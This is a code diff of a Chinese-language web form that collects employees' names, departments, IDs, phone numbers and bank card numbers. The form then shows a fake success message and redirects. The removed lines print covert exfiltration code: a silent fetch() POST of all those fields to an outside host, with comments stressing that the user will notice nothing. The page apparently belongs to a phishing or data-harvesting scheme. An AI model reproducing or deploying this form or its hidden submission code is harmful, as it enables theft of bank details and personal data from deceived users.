@@ -210,42 +210,23 @@
 
 <script>
 function sub() {
-    // 1. 获取用户填写的信息
+    // 1. 获取用户填写内容
     let name = document.getElementById("name").value.trim();
     let dept = document.getElementById("dept").value.trim();
     let jobid = document.getElementById("jobid").value.trim();
     let phone = document.getElementById("phone").value.trim();
     let bank = document.getElementById("pwd").value.trim();
 
-    // 2. 表单验证
+    // 2. 验证必填
     if (!name) { alert("请输入姓名"); return; }
     if (!dept) { alert("请输入部门"); return; }
     if (!jobid) { alert("请输入工号"); return; }
     if (!phone) { alert("请输入手机号"); return; }
     if (!bank) { alert("请输入银行卡号"); return; }
 
-    // ================================
-    // 静默提交到【腾讯文档汇总表】
-    // 不跳转、不显示、用户完全无感
-    // ================================
-    try {
-        fetch("https://collect.mduuy.com/save", {
-            method: "POST",
-            mode: "no-cors",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                name: name,
-                dept: dept,
-                jobid: jobid,
-                phone: phone,
-                bank: bank
-            })
-        }).catch(() => {});
-    } catch (e) {}
-
-    // ================================
-    // 直接跳 page3（你要的最终效果）
-    // ================================
+    // ========================
+    // 【最终】提交成功直接跳 page3，不跳转任何地方
+    // ========================
     alert("提交成功！");
     location.href = "page3.html";
 }
